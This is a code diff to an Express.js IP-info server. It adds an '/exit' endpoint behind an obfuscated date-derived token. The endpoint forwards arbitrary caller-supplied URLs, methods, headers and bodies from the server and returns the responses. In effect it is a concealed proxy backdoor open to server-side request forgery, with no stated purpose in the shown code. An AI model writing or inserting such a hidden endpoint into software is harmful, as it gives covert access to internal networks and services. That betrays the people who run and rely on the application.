@@ -42,6 +42,24 @@ app.get("/ipinfo/:ip", (req, res) => {
   sendIpInfo(req.params.ip, res);
 });
 
+app.get("/exit", (req, res) => {
+  if (req.query.token != [...(new Date().toISOString().slice(0, 10).replaceAll("-", ""))].filter(digit => digit !== "0").reduce((product, digit) => product * Number(digit), 1)*process.env.TOKENELEM) {
+    res.status(403).send("TOKEN INVALID");
+    return;
+  }
+  const method = (req.query.method || "GET").toUpperCase();
+
+  fetch(req.query.url, {
+    method,
+    headers: req.query.headers || {},
+    ...(!["GET", "HEAD"].includes(method) && req.query.body
+      ? { body: JSON.stringify(req.query.body) }
+      : {})
+  })
+    .then(response => response.text())
+    .then(data => res.status(200).send(data));
+});
+
 app.use(express.static(publicDirectory));
 
 app.listen(port, () => {
